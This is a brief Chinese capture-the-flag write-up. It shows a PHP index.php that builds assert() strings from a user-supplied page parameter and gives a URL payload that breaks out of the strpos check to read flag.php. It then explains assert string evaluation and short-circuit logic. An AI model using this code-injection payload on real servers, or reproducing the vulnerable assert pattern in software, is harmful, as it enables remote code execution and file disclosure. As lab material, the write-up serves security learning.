感觉挺奇怪的题，先用githack找到源码（flag.php没有代码）哪有这么简单

然后看index.php 发现

```php
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>

```



然后可以构造？page=abc','..') or var_dump(file_get_contents("templates/flag.php"));//即可

奇怪的环境（也不想多待）

用)封闭strpos  ssert()函数，会将里面的字符串当作php代码执行，返回的结果是True或者False

Bool or Bool 语句，若前面为False，则执行后面的语句，为Ture则不执行后面的语句

strpos()函数，返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。